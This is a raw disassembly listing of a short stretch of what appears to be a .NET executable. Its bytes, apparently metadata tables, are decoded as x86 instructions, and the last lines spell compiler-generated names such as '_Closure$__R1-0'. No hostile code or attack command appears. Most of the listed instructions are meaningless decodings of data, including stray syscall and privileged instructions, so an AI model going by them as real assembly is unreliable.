  405419:	00 44 00 ee          	add    %al,-0x12(%eax,%eax,1)
  40541d:	0e                   	push   %cs
  40541e:	85 02                	test   %eax,(%edx)
  405420:	49                   	dec    %ecx
  405421:	01 38                	add    %edi,(%eax)
  405423:	09 94 02 59 01 d2 0a 	or     %edx,0xad20159(%edx,%eax,1)
  40542a:	b7 02                	mov    $0x2,%bh
  40542c:	59                   	pop    %ecx
  40542d:	01 69 04             	add    %ebp,0x4(%ecx)
  405430:	72 02                	jb     0x405434
  405432:	19 01                	sbb    %eax,(%ecx)
  405434:	19 09                	sbb    %ecx,(%ecx)
  405436:	c2 02 19             	ret    $0x1902
  405439:	01 d9                	add    %ebx,%ecx
  40543b:	06                   	push   %es
  40543c:	c7 02 19 01 8f 01    	movl   $0x18f0119,(%edx)
  405442:	cb                   	lret
  405443:	02 71 01             	add    0x1(%ecx),%dh
  405446:	1b 04 13             	sbb    (%ebx,%edx,1),%eax
  405449:	00 19                	add    %bl,(%ecx)
  40544b:	01 d2                	add    %edx,%edx
  40544d:	0a d3                	or     %bl,%dl
  40544f:	02 59 01             	add    0x1(%ecx),%bl
  405452:	d2 0a                	rorb   %cl,(%edx)
  405454:	d9 02                	flds   (%edx)
  405456:	79 01                	jns    0x405459
  405458:	84 00                	test   %al,(%eax)
  40545a:	e3 02                	jecxz  0x40545e
  40545c:	59                   	pop    %ecx
  40545d:	01 8f 01 cb 02 81    	add    %ecx,-0x7efd34ff(%edi)
  405463:	01 70 0d             	add    %esi,0xd(%eax)
  405466:	ff 02                	incl   (%edx)
  405468:	d1 00                	roll   $1,(%eax)
  40546a:	99                   	cltd
  40546b:	03 05 02 89 01 43    	add    0x43018902,%eax
  405471:	09 09                	or     %ecx,(%ecx)
  405473:	03 91 01 8a 03 1c    	add    0x1c038a01(%ecx),%edx
  405479:	01 c1                	add    %eax,%ecx
  40547b:	00 f9                	add    %bh,%cl
  40547d:	01 0f                	add    %ecx,(%edi)
  40547f:	03 a1 01 d2 0a a8    	add    -0x57f52dff(%ecx),%esp
  405485:	00 a9 01 c2 03 1e    	add    %ch,0x1e03c201(%ecx)
  40548b:	03 99 01 7e 06 24    	add    0x24067e01(%ecx),%ebx
  405491:	03 c1                	add    %ecx,%eax
  405493:	00 32                	add    %dh,(%edx)
  405495:	0d 29 03 c9 01       	or     $0x1c90329,%eax
  40549a:	d2 0a                	rorb   %cl,(%edx)
  40549c:	a8 00                	test   $0x0,%al
  40549e:	c9                   	leave
  40549f:	01 16                	add    %edx,(%esi)
  4054a1:	0c 40                	or     $0x40,%al
  4054a3:	03 b1 01 ba 0a 46    	add    0x460aba01(%ecx),%esi
  4054a9:	03 b9 01 5e 0e 4c    	add    0x4c0e5e01(%ecx),%edi
  4054af:	03 81 01 70 06 52    	add    0x52067001(%ecx),%eax
  4054b5:	03 d1                	add    %ecx,%edx
  4054b7:	01 f7                	add    %esi,%edi
  4054b9:	07                   	pop    %es
  4054ba:	59                   	pop    %ecx
  4054bb:	03 b9 01 b9 0e 5e    	add    0x5e0eb901(%ecx),%edi
  4054c1:	03 e1                	add    %ecx,%esp
  4054c3:	01 d2                	add    %edx,%edx
  4054c5:	0a 13                	or     (%ebx),%dl
  4054c7:	00 e9                	add    %ch,%cl
  4054c9:	01 aa 06 6f 03 d9    	add    %ebp,-0x26fc90fa(%edx)
  4054cf:	01 d2                	add    %edx,%edx
  4054d1:	0a 13                	or     (%ebx),%dl
  4054d3:	00 69 01             	add    %ch,0x1(%ecx)
  4054d6:	7e 06                	jle    0x4054de
  4054d8:	24 03                	and    $0x3,%al
  4054da:	d9 01                	flds   (%ecx)
  4054dc:	d6                   	salc
  4054dd:	01 76 03             	add    %esi,0x3(%esi)
  4054e0:	d9 01                	flds   (%ecx)
  4054e2:	7e 06                	jle    0x4054ea
  4054e4:	1c 01                	sbb    $0x1,%al
  4054e6:	c1 00 34             	roll   $0x34,(%eax)
  4054e9:	0a 1c 01             	or     (%ecx,%eax,1),%bl
  4054ec:	d1 00                	roll   $1,(%eax)
  4054ee:	7a 03                	jp     0x4054f3
  4054f0:	05 02 f1 01 d2       	add    $0xd201f102,%eax
  4054f5:	0a 26                	or     (%esi),%ah
  4054f7:	00 f1                	add    %dh,%cl
  4054f9:	01 b6 0d 40 03 c1    	add    %esi,-0x3efcbff3(%esi)
  4054ff:	00 8b 0f 8b 03 c1    	add    %cl,-0x3efc74f1(%ebx)
  405505:	00 7e 06             	add    %bh,0x6(%esi)
  405508:	1c 01                	sbb    $0x1,%al
  40550a:	f9                   	stc
  40550b:	01 6a 0e             	add    %ebp,0xe(%edx)
  40550e:	97                   	xchg   %eax,%edi
  40550f:	03 01                	add    (%ecx),%eax
  405511:	02 d2                	add    %dl,%dl
  405513:	0a 9d 03 01 02 25    	or     0x25020103(%ebp),%bl
  405519:	03 a4 03 11 02 a6 03 	add    0x3a60211(%ebx,%eax,1),%esp
  405520:	ba 03 c1 00 4a       	mov    $0x4a00c103,%edx
  405525:	0d c2 03 f1 01       	or     $0x1f103c2,%eax
  40552a:	d2 0a                	rorb   %cl,(%edx)
  40552c:	a8 00                	test   $0x0,%al
  40552e:	c1 01 d2             	roll   $0xd2,(%ecx)
  405531:	0a a8 00 c1 01 b6    	or     -0x49fe3f00(%eax),%ch
  405537:	0d 13 00 19 02       	or     $0x2190013,%eax
  40553c:	4e                   	dec    %esi
  40553d:	0f 05                	syscall
  40553f:	02 c1                	add    %cl,%al
  405541:	00 91 06 de 03 21    	add    %dl,0x2103de06(%ecx)
  405547:	02 23                	add    (%ebx),%ah
  405549:	0c e4                	or     $0xe4,%al
  40554b:	03 29                	add    (%ecx),%ebp
  40554d:	00 eb                	add    %ch,%bl
  40554f:	01 f1                	add    %esi,%ecx
  405551:	03 29                	add    (%ecx),%ebp
  405553:	02 ce                	add    %dh,%cl
  405555:	0e                   	push   %cs
  405556:	1c 01                	sbb    $0x1,%al
  405558:	c1 00 e4             	roll   $0xe4,(%eax)
  40555b:	06                   	push   %es
  40555c:	f1                   	int1
  40555d:	01 31                	add    %esi,(%ecx)
  40555f:	02 d2                	add    %dl,%dl
  405561:	0a f7                	or     %bh,%dh
  405563:	03 39                	add    (%ecx),%edi
  405565:	02 d2                	add    %dl,%dl
  405567:	0a fd                	or     %ch,%bh
  405569:	03 39                	add    (%ecx),%edi
  40556b:	02 50 04             	add    0x4(%eax),%dl
  40556e:	04 04                	add    $0x4,%al
  405570:	39 02                	cmp    %eax,(%edx)
  405572:	88 0e                	mov    %cl,(%esi)
  405574:	0b 04 39             	or     (%ecx,%edi,1),%eax
  405577:	02 9c 09 10 04 29 02 	add    0x2290410(%ecx,%ecx,1),%bl
  40557e:	d6                   	salc
  40557f:	0e                   	push   %cs
  405580:	a8 00                	test   $0x0,%al
  405582:	09 01                	or     %eax,(%ecx)
  405584:	45                   	inc    %ebp
  405585:	08 d0                	or     %dl,%al
  405587:	01 e9                	add    %ebp,%ecx
  405589:	00 30                	add    %dh,(%eax)
  40558b:	09 fa                	or     %edi,%edx
  40558d:	01 09                	add    %ecx,(%ecx)
  40558f:	01 d0                	add    %edx,%eax
  405591:	09 2b                	or     %ebp,(%ebx)
  405593:	04 11                	add    $0x11,%al
  405595:	02 47 02             	add    0x2(%edi),%al
  405598:	86 00                	xchg   %al,(%eax)
  40559a:	81 01 51 0d ff 02    	addl   $0x2ff0d51,(%ecx)
  4055a0:	71 02                	jno    0x4055a4
  4055a2:	5e                   	pop    %esi
  4055a3:	08 5e 04             	or     %bl,0x4(%esi)
  4055a6:	71 02                	jno    0x4055aa
  4055a8:	23 0b                	and    (%ebx),%ecx
  4055aa:	64 04 51             	fs add $0x51,%al
  4055ad:	02 cf                	add    %bh,%cl
  4055af:	06                   	push   %es
  4055b0:	0c 01                	or     $0x1,%al
  4055b2:	51                   	push   %ecx
  4055b3:	02 e1                	add    %cl,%ah
  4055b5:	0d 0c 01 59 02       	or     $0x259010c,%eax
  4055ba:	d2 0a                	rorb   %cl,(%edx)
  4055bc:	6a 04                	push   $0x4
  4055be:	69 02 7c 02 73 04    	imul   $0x473027c,(%edx),%eax
  4055c4:	81 02 cf 06 0c 01    	addl   $0x10c06cf,(%edx)
  4055ca:	81 02 e1 0d 0c 01    	addl   $0x10c0de1,(%edx)
  4055d0:	61                   	popa
  4055d1:	02 d2                	add    %dl,%dl
  4055d3:	0a 7c 04 69          	or     0x69(%esp,%eax,1),%bh
  4055d7:	02 4f 08             	add    0x8(%edi),%cl
  4055da:	82 04 59 02          	addb   $0x2,(%ecx,%ebx,2)
  4055de:	d2 0a                	rorb   %cl,(%edx)
  4055e0:	7c 04                	jl     0x4055e6
  4055e2:	51                   	push   %ecx
  4055e3:	02 d2                	add    %dl,%dl
  4055e5:	0a 90 04 69 02 86    	or     -0x79fd96fc(%eax),%dl
  4055eb:	02 98 04 99 02 eb    	add    -0x14fd66fc(%eax),%bl
  4055f1:	05 a8 04 81 02       	add    $0x28104a8,%eax
  4055f6:	b5 05                	mov    $0x5,%ch
  4055f8:	ae                   	scas   %es:(%edi),%al
  4055f9:	04 01                	add    $0x1,%al
  4055fb:	01 04 0e             	add    %eax,(%esi,%ecx,1)
  4055fe:	20 02                	and    %al,(%edx)
  405600:	81 02 1b 04 13 00    	addl   $0x13041b,(%edx)
  405606:	69 02 1b 04 13 00    	imul   $0x13041b,(%edx),%eax
  40560c:	a1 02 d4 03 f7       	mov    0xf703d402,%eax
  405611:	02 a1 00 90 02 1c    	add    0x1c029000(%ecx),%ah
  405617:	01 b1 02 97 08 cf    	add    %esi,-0x30f768fe(%ecx)
  40561d:	04 b1                	add    $0xb1,%al
  40561f:	02 9b 01 d5 04 b9    	add    -0x46fb2aff(%ebx),%bl
  405625:	02 32                	add    (%edx),%dh
  405627:	0c dd                	or     $0xdd,%al
  405629:	04 69                	add    $0x69,%al
  40562b:	00 2e                	add    %ch,(%esi)
  40562d:	0b e3                	or     %ebx,%esp
  40562f:	04 c1                	add    $0xc1,%al
  405631:	02 55 03             	add    0x3(%ebp),%dl
  405634:	1c 01                	sbb    $0x1,%al
  405636:	d1 02                	roll   $1,(%edx)
  405638:	9c                   	pushf
  405639:	02 ea                	add    %dl,%ch
  40563b:	04 e1                	add    $0xe1,%al
  40563d:	02 d2                	add    %dl,%dl
  40563f:	0a 13                	or     (%ebx),%dl
  405641:	00 f1                	add    %dh,%cl
  405643:	02 d2                	add    %dl,%dl
  405645:	0a f7                	or     %bh,%dh
  405647:	03 39                	add    (%ecx),%edi
  405649:	02 d2                	add    %dl,%dl
  40564b:	0a 1e                	or     (%esi),%bl
  40564d:	05 4c 00 d2 0a       	add    $0xad2004c,%eax
  405652:	13 00                	adc    (%eax),%eax
  405654:	d9 02                	flds   (%edx)
  405656:	10 0e                	adc    %cl,(%esi)
  405658:	36 05 f9 02 cf 07    	ss add $0x7cf02f9,%eax
  40565e:	3c 05                	cmp    $0x5,%al
  405660:	d9 02                	flds   (%edx)
  405662:	ba 02 0c 01 d9       	mov    $0xd9010c02,%edx
  405667:	02 c3                	add    %bl,%al
  405669:	01 5e 03             	add    %ebx,0x3(%esi)
  40566c:	f9                   	stc
  40566d:	02 ba 05 44 05 11    	add    0x11054405(%edx),%bh
  405673:	03 ad 0d 4f 05 41    	add    0x41054f0d(%ebp),%ebp
  405679:	01 d9                	add    %ebx,%ecx
  40567b:	06                   	push   %es
  40567c:	0c 01                	or     $0x1,%al
  40567e:	11 03                	adc    %eax,(%ebx)
  405680:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405681:	0d 5b 05 09 01       	or     $0x109055b,%eax
  405686:	d0 09                	rorb   $1,(%ecx)
  405688:	6c                   	insb   (%dx),%es:(%edi)
  405689:	05 e1 02 bd 0e       	add    $0xebd02e1,%eax
  40568e:	71 05                	jno    0x405695
  405690:	d9 02                	flds   (%edx)
  405692:	15 04 13 00 e9       	adc    $0xe9001304,%eax
  405697:	02 1b                	add    (%ebx),%bl
  405699:	04 13                	add    $0x13,%al
  40569b:	00 d9                	add    %bl,%cl
  40569d:	02 d2                	add    %dl,%dl
  40569f:	0a 13                	or     (%ebx),%dl
  4056a1:	00 d9                	add    %bl,%cl
  4056a3:	02 d5                	add    %ch,%dl
  4056a5:	05 90 05 d9 02       	add    $0x2d90590,%eax
  4056aa:	c2 05 90             	ret    $0x9005
  4056ad:	05 d9 02 a6 0e       	add    $0xea602d9,%eax
  4056b2:	90                   	nop
  4056b3:	05 d9 02 96 0e       	add    $0xe9602d9,%eax
  4056b8:	90                   	nop
  4056b9:	05 21 03 d2 0a       	add    $0xad20321,%eax
  4056be:	13 00                	adc    (%eax),%eax
  4056c0:	29 03                	sub    %eax,(%ebx)
  4056c2:	d2 0a                	rorb   %cl,(%edx)
  4056c4:	26 00 21             	add    %ah,%es:(%ecx)
  4056c7:	03 7c 0c 95          	add    -0x6b(%esp,%ecx,1),%edi
  4056cb:	05 e1 02 bd 0e       	add    $0xebd02e1,%eax
  4056d0:	9c                   	pushf
  4056d1:	05 39 03 1b 04       	add    $0x41b0339,%eax
  4056d6:	13 00                	adc    (%eax),%eax
  4056d8:	d9 02                	flds   (%edx)
  4056da:	9d                   	popf
  4056db:	0d a2 05 11 01       	or     $0x11105a2,%eax
  4056e0:	7e 06                	jle    0x4056e8
  4056e2:	1c 01                	sbb    $0x1,%al
  4056e4:	c1 00 32             	roll   $0x32,(%eax)
  4056e7:	0d a8 05 19 03       	or     $0x31905a8,%eax
  4056ec:	d2 0a                	rorb   %cl,(%edx)
  4056ee:	f7 03 e9 02 d2 0a    	testl  $0xad202e9,(%ebx)
  4056f4:	ae                   	scas   %es:(%edi),%al
  4056f5:	05 41 03 48 0a       	add    $0xa480341,%eax
  4056fa:	c1 05 f9 02 d1 01 44 	roll   $0x44,0x1d102f9
  405701:	05 41 03 ff 0d       	add    $0xdff0341,%eax
  405706:	c1 05 c9 02 7e 06 1c 	roll   $0x1c,0x67e02c9
  40570d:	01 49 03             	add    %ecx,0x3(%ecx)
  405710:	d2 0a                	rorb   %cl,(%edx)
  405712:	13 00                	adc    (%eax),%eax
  405714:	41                   	inc    %ecx
  405715:	01 3d 0f e4 05 51    	add    %edi,0x5105e40f
  40571b:	03 f6                	add    %esi,%esi
  40571d:	0e                   	push   %cs
  40571e:	d3 02                	roll   %cl,(%edx)
  405720:	51                   	push   %ecx
  405721:	03 35 02 f1 05 51    	add    0x5105f102,%esi
  405727:	03 f7                	add    %edi,%esi
  405729:	0a f8                	or     %al,%bh
  40572b:	05 61 03 fd 06       	add    $0x6fd0361,%eax
  405730:	fe 05 b9 00 61 06    	incb   0x66100b9
  405736:	32 02                	xor    (%edx),%al
  405738:	51                   	push   %ecx
  405739:	03 e7                	add    %edi,%esp
  40573b:	0a f8                	or     %al,%bh
  40573d:	05 69 03 5e 03       	add    $0x35e0369,%eax
  405742:	05 02 69 03 6e       	add    $0x6e036902,%eax
  405747:	03 fa                	add    %edx,%edi
  405749:	01 21                	add    %esp,(%ecx)
  40574b:	03 0d 03 26 00 11    	add    0x11002603,%ecx
  405751:	02 88 0e 12 06 81    	add    -0x7ef9edf2(%eax),%cl
  405757:	01 66 07             	add    %esp,0x7(%esi)
  40575a:	20 06                	and    %al,(%esi)
  40575c:	71 03                	jno    0x405761
  40575e:	15 04 13 00 11       	adc    $0x11001304,%eax
  405763:	03 9d 07 27 06 21    	add    0x21062707(%ebp),%ebx
  405769:	02 2b                	add    (%ebx),%ch
  40576b:	0d d0 01 21 02       	or     $0x22101d0,%eax
  405770:	62 0f                	bound  %ecx,(%edi)
  405772:	39 06                	cmp    %eax,(%esi)
  405774:	d9 00                	flds   (%eax)
  405776:	62 04 f7             	bound  %eax,(%edi,%esi,8)
  405779:	02 81 03 d2 0a 4e    	add    0x4e0ad203(%ecx),%al
  40577f:	06                   	push   %es
  405780:	81 03 d9 06 c7 02    	addl   $0x2c706d9,(%ebx)
  405786:	81 03 8f 01 cb 02    	addl   $0x2cb018f,(%ebx)
  40578c:	81 03 69 04 72 02    	addl   $0x2720469,(%ebx)
  405792:	81 03 b6 06 13 00    	addl   $0x1306b6,(%ebx)
  405798:	39 01                	cmp    %eax,(%ecx)
  40579a:	15 04 13 00 49       	adc    $0x49001304,%eax
  40579f:	02 d2                	add    %dl,%dl
  4057a1:	0a 63 06             	or     0x6(%ebx),%ah
  4057a4:	39 02                	cmp    %eax,(%edx)
  4057a6:	88 0e                	mov    %cl,(%esi)
  4057a8:	13 00                	adc    (%eax),%eax
  4057aa:	99                   	cltd
  4057ab:	03 d2                	add    %edx,%edx
  4057ad:	0a f7                	or     %bh,%dh
  4057af:	03 a1 03 05 06 6b    	add    0x6b060503(%ecx),%esp
  4057b5:	06                   	push   %es
  4057b6:	a9 03 d2 0a 13       	test   $0x130ad203,%eax
  4057bb:	00 f9                	add    %bh,%cl
  4057bd:	00 8f 0a 82 06 12    	add    %cl,0x1206820a(%edi)
  4057c3:	00 79 00             	add    %bh,0x0(%ecx)
  4057c6:	f8                   	clc
  4057c7:	04 08                	add    $0x8,%al
  4057c9:	00 bc 00 45 00 08 00 	add    %bh,0x80045(%eax,%eax,1)
  4057d0:	c0 00 99             	rolb   $0x99,(%eax)
  4057d3:	06                   	push   %es
  4057d4:	08 00                	or     %al,(%eax)
  4057d6:	c4 00                	les    (%eax),%eax
  4057d8:	9e                   	sahf
  4057d9:	06                   	push   %es
  4057da:	29 00                	sub    %eax,(%eax)
  4057dc:	73 00                	jae    0x4057de
  4057de:	ad                   	lods   %ds:(%esi),%eax
  4057df:	00 40 00             	add    %al,0x0(%eax)
  4057e2:	13 00                	adc    (%eax),%eax
  4057e4:	1d 00 40 00 2b       	sbb    $0x2b004000,%eax
  4057e9:	00 45 00             	add    %al,0x0(%ebp)
  4057ec:	43                   	inc    %ebx
  4057ed:	00 13                	add    %dl,(%ebx)
  4057ef:	00 1d 00 43 00 1b    	add    %bl,0x1b004300
  4057f5:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4057f8:	49                   	dec    %ecx
  4057f9:	00 73 00             	add    %dh,0x0(%ebx)
  4057fc:	c3                   	ret
  4057fd:	00 63 00             	add    %ah,0x0(%ebx)
  405800:	13 00                	adc    (%eax),%eax
  405802:	1d 00 63 00 1b       	sbb    $0x1b006300,%eax
  405807:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40580a:	69 00 73 00 dc 00    	imul   $0xdc0073,(%eax),%eax
  405810:	80 00 2b             	addb   $0x2b,(%eax)
  405813:	00 45 00             	add    %al,0x0(%ebp)
  405816:	83 00 7b             	addl   $0x7b,(%eax)
  405819:	00 45 00             	add    %al,0x0(%ebp)
  40581c:	83 00 83             	addl   $0xffffff83,(%eax)
  40581f:	00 45 00             	add    %al,0x0(%ebp)
  405822:	83 00 1b             	addl   $0x1b,(%eax)
  405825:	00 2c 00             	add    %ch,(%eax,%eax,1)
  405828:	89 00                	mov    %eax,(%eax)
  40582a:	73 00                	jae    0x40582c
  40582c:	ee                   	out    %al,(%dx)
  40582d:	00 a0 00 2b 00 45    	add    %ah,0x45002b00(%eax)
  405833:	00 a1 00 cb 00 45    	add    %ah,0x4500cb00(%ecx)
  405839:	00 a1 00 d3 00 45    	add    %ah,0x4500d300(%ecx)
  40583f:	00 a3 00 c3 00 4b    	add    %ah,0x4b00c300(%ebx)
  405845:	01 a3 00 13 00 1d    	add    %esp,0x1d001300(%ebx)
  40584b:	00 c0                	add    %al,%al
  40584d:	00 2b                	add    %ch,(%ebx)
  40584f:	00 45 00             	add    %al,0x0(%ebp)
  405852:	c3                   	ret
  405853:	00 e3                	add    %ah,%bl
  405855:	00 ca                	add    %cl,%dl
  405857:	01 c3                	add    %eax,%ebx
  405859:	00 13                	add    %dl,(%ebx)
  40585b:	00 1d 00 e0 00 2b    	add    %bl,0x2b00e000
  405861:	00 45 00             	add    %al,0x0(%ebp)
  405864:	00 01                	add    %al,(%ecx)
  405866:	2b 00                	sub    (%eax),%eax
  405868:	45                   	inc    %ebp
  405869:	00 00                	add    %al,(%eax)
  40586b:	01 13                	add    %edx,(%ebx)
  40586d:	00 1d 00 03 01 7b    	add    %bl,0x7b010300
  405873:	00 45 00             	add    %al,0x0(%ebp)
  405876:	20 01                	and    %al,(%ecx)
  405878:	2b 00                	sub    (%eax),%eax
  40587a:	45                   	inc    %ebp
  40587b:	00 20                	add    %ah,(%eax)
  40587d:	01 13                	add    %edx,(%ebx)
  40587f:	00 1d 00 40 01 13    	add    %bl,0x13014000
  405885:	00 1d 00 40 01 2b    	add    %bl,0x2b014000
  40588b:	00 45 00             	add    %al,0x0(%ebp)
  40588e:	60                   	pusha
  40588f:	01 2b                	add    %ebp,(%ebx)
  405891:	00 45 00             	add    %al,0x0(%ebp)
  405894:	60                   	pusha
  405895:	01 13                	add    %edx,(%ebx)
  405897:	00 1d 00 63 01 d3    	add    %bl,0xd3016300
  40589d:	00 45 00             	add    %al,0x0(%ebp)
  4058a0:	80 01 2b             	addb   $0x2b,(%ecx)
  4058a3:	00 45 00             	add    %al,0x0(%ebp)
  4058a6:	a0 01 2b 00 45       	mov    0x45002b01,%al
  4058ab:	00 c0                	add    %al,%al
  4058ad:	01 2b                	add    %ebp,(%ebx)
  4058af:	00 45 00             	add    %al,0x0(%ebp)
  4058b2:	c0 01 13             	rolb   $0x13,(%ecx)
  4058b5:	00 1d 00 e0 01 2b    	add    %bl,0x2b01e000
  4058bb:	00 45 00             	add    %al,0x0(%ebp)
  4058be:	00 02                	add    %al,(%edx)
  4058c0:	13 00                	adc    (%eax),%eax
  4058c2:	1d 00 00 02 2b       	sbb    $0x2b020000,%eax
  4058c7:	00 45 00             	add    %al,0x0(%ebp)
  4058ca:	03 02                	add    (%edx),%eax
  4058cc:	d3 00                	roll   %cl,(%eax)
  4058ce:	45                   	inc    %ebp
  4058cf:	00 a0 0a bb 06 45    	add    %ah,0x4506bb0a(%eax)
  4058d5:	00 23                	add    %ah,(%ebx)
  4058d7:	00 f3                	add    %dh,%bl
  4058d9:	02 25 00 f5 02 33    	add    0x3302f500,%ah
  4058df:	00 f3                	add    %dh,%bl
  4058e1:	02 35 00 f3 02 37    	add    0x3702f300,%dh
  4058e7:	00 f3                	add    %dh,%bl
  4058e9:	02 20                	add    (%eax),%ah
  4058eb:	01 d5                	add    %edx,%ebp
  4058ed:	01 3d 02 54 02 a2    	add    %edi,0xa2025402
  4058f3:	02 15 03 30 03 62    	add    0x62033003,%dl
  4058f9:	03 7d 03             	add    0x3(%ebp),%edi
  4058fc:	8e 03                	mov    (%ebx),%es
  4058fe:	ab                   	stos   %eax,%es:(%edi)
  4058ff:	03 c8                	add    %eax,%ecx
  405901:	03 d1                	add    %ecx,%edx
  405903:	03 ea                	add    %edx,%ebp
  405905:	03 38                	add    (%eax),%edi
  405907:	04 3e                	add    $0x3e,%al
  405909:	04 be                	add    $0xbe,%al
  40590b:	04 2c                	add    $0x2c,%al
  40590d:	05 76 05 b8 05       	add    $0x5b80576,%eax
  405912:	d4 05                	aam    $0x5
  405914:	07                   	pop    %es
  405915:	06                   	push   %es
  405916:	19 06                	sbb    %eax,(%esi)
  405918:	40                   	inc    %eax
  405919:	06                   	push   %es
  40591a:	5e                   	pop    %esi
  40591b:	06                   	push   %es
  40591c:	72 06                	jb     0x405924
  40591e:	04 00                	add    $0x0,%al
  405920:	01 00                	add    %eax,(%eax)
  405922:	06                   	push   %es
  405923:	00 05 00 00 00 6c    	add    %al,0x6c000000
  405929:	0a a3 00 00 00 c1    	or     -0x3f000000(%ebx),%ah
  40592f:	08 be 00 00 00 43    	or     %bh,0x43000000(%esi)
  405935:	0a d7                	or     %bh,%dl
  405937:	00 00                	add    %al,(%eax)
  405939:	00 59 0b             	add    %bl,0xb(%ecx)
  40593c:	e9 00 00 00 14       	jmp    0x14405941
  405941:	02 c0                	add    %al,%al
  405943:	01 02                	add    %eax,(%edx)
  405945:	00 04 00             	add    %al,(%eax,%eax,1)
  405948:	03 00                	add    (%eax),%eax
  40594a:	02 00                	add    (%eax),%al
  40594c:	05 00 05 00 02       	add    $0x2000500,%eax
  405951:	00 06                	add    %al,(%esi)
  405953:	00 07                	add    %al,(%edi)
  405955:	00 02                	add    %al,(%edx)
  405957:	00 07                	add    %al,(%edi)
  405959:	00 09                	add    %cl,(%ecx)
  40595b:	00 02                	add    %al,(%edx)
  40595d:	00 0f                	add    %cl,(%edi)
  40595f:	00 0b                	add    %cl,(%ebx)
  405961:	00 a6 07 b3 07 bd    	add    %ah,-0x42f84cf9(%esi)
  405967:	07                   	pop    %es
  405968:	6b 00 6a             	imul   $0x6a,(%eax),%eax
  40596b:	00 71 00             	add    %dh,0x0(%ecx)
  40596e:	78 00                	js     0x405970
  405970:	7f 00                	jg     0x405972
  405972:	25 01 b1 01 b8       	and    $0xb801b101,%eax
  405977:	01 5f 02             	add    %ebx,0x2(%edi)
  40597a:	25 05 58 05 00       	and    $0x55805,%eax
  40597f:	01 25 00 42 0f 01    	add    %esp,0x10f4200
  405985:	00 66 11             	add    %ah,0x11(%esi)
  405988:	39 00                	cmp    %eax,(%eax)
  40598a:	1a 03                	sbb    (%ebx),%al
  40598c:	01 00                	add    %eax,(%eax)
  40598e:	40                   	inc    %eax
  40598f:	01 6f 00             	add    %ebp,0x0(%edi)
  405992:	11 07                	adc    %eax,(%edi)
  405994:	02 00                	add    (%eax),%al
  405996:	43                   	inc    %ebx
  405997:	01 ad 00 cc 0d 03    	add    %ebp,0x30dcc00(%ebp)
  40599d:	00 43 01             	add    %al,0x1(%ebx)
  4059a0:	b7 00                	mov    $0x0,%bh
  4059a2:	38 04 04             	cmp    %al,(%esp,%eax,1)
  4059a5:	00 00                	add    %al,(%eax)
  4059a7:	00 00                	add    %al,(%eax)
  4059a9:	00 05 00 03 00 03    	add    %al,0x3000300
  4059af:	00 05 00 00 00 00    	add    %al,0x0
  4059b5:	00 00                	add    %al,(%eax)
  4059b7:	00 d6                	add    %dl,%dh
  4059b9:	11 00                	adc    %eax,(%eax)
  4059bb:	00 02                	add    %al,(%edx)
	...
  4059c5:	00 00                	add    %al,(%eax)
  4059c7:	00 01                	add    %al,(%ecx)
  4059c9:	00 55 01             	add    %dl,0x1(%ebp)
  4059cc:	00 00                	add    %al,(%eax)
  4059ce:	00 00                	add    %al,(%eax)
  4059d0:	02 00                	add    (%eax),%al
	...
  4059da:	00 00                	add    %al,(%eax)
  4059dc:	01 00                	add    %eax,(%eax)
  4059de:	00 08                	add    %cl,(%eax)
  4059e0:	00 00                	add    %al,(%eax)
  4059e2:	00 00                	add    %al,(%eax)
  4059e4:	08 00                	or     %al,(%eax)
	...
  4059ee:	00 00                	add    %al,(%eax)
  4059f0:	0a 00                	or     (%eax),%al
  4059f2:	79 01                	jns    0x4059f5
  4059f4:	00 00                	add    %al,(%eax)
  4059f6:	00 00                	add    %al,(%eax)
  4059f8:	02 00                	add    (%eax),%al
	...
  405a02:	00 00                	add    %al,(%eax)
  405a04:	0a 00                	or     (%eax),%al
  405a06:	9b                   	fwait
  405a07:	06                   	push   %es
  405a08:	00 00                	add    %al,(%eax)
  405a0a:	00 00                	add    %al,(%eax)
  405a0c:	02 00                	add    (%eax),%al
	...
  405a16:	00 00                	add    %al,(%eax)
  405a18:	0a 00                	or     (%eax),%al
  405a1a:	2f                   	das
  405a1b:	0e                   	push   %cs
  405a1c:	00 00                	add    %al,(%eax)
  405a1e:	00 00                	add    %al,(%eax)
  405a20:	02 00                	add    (%eax),%al
	...
  405a2a:	00 00                	add    %al,(%eax)
  405a2c:	01 00                	add    %eax,(%eax)
  405a2e:	93                   	xchg   %eax,%ebx
  405a2f:	0c 00                	or     $0x0,%al
  405a31:	00 00                	add    %al,(%eax)
  405a33:	00 05 00 04 00 06    	add    %al,0x6000400
  405a39:	00 04 00             	add    %al,(%eax,%eax,1)
  405a3c:	0b 00                	or     (%eax),%eax
  405a3e:	0a 00                	or     (%eax),%al
  405a40:	10 00                	adc    %al,(%eax)
  405a42:	0f 00 16             	lldt   (%esi)
  405a45:	00 15 00 00 00 10    	add    %dl,0x10000000
  405a4b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  405a4e:	0c 01                	or     $0x1,%al
  405a50:	00 00                	add    %al,(%eax)
  405a52:	10 00                	adc    %al,(%eax)
  405a54:	19 00                	sbb    %eax,(%eax)
  405a56:	0c 01                	or     $0x1,%al
  405a58:	00 00                	add    %al,(%eax)
  405a5a:	00 00                	add    %al,(%eax)
  405a5c:	1b 00                	sbb    (%eax),%eax
  405a5e:	0c 01                	or     $0x1,%al
  405a60:	2d 00 2e 01 2d       	sub    $0x2d012e00,%eax
  405a65:	00 bb 01 00 5f 43    	add    %bh,0x435f0001(%ebx)
  405a6b:	6c                   	insb   (%dx),%es:(%edi)
  405a6c:	6f                   	outsl  %ds:(%esi),(%dx)
  405a6d:	73 75                	jae    0x405ae4
  405a6f:	72 65                	jb     0x405ad6
  405a71:	24 5f                	and    $0x5f,%al
  405a73:	5f                   	pop    %edi
  405a74:	52                   	push   %edx
  405a75:	31 2d 30 00 61 30    	xor    %ebp,0x30610030
  405a7b:	00 61 72             	add    %ah,0x72(%ecx)
  405a7e:	67 30 00             	xor    %al,(%bx,%si)
  405a81:	24 49                	and    $0x49,%al
  405a83:	52                   	push   %edx
  405a84:	31 32                	xor    %esi,(%edx)
  405a86:	2d 31 00 5f 4c       	sub    $0x4c5f0031,%eax
  405a8b:	61                   	popa
  405a8c:	6d                   	insl   (%dx),%es:(%edi)
  405a8d:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  405a91:	5f                   	pop    %edi
  405a92:	5f                   	pop    %edi
  405a93:	52                   	push   %edx
  405a94:	31 32                	xor    %esi,(%edx)
  405a96:	2d 31 00 54 68       	sub    $0x68540031,%eax
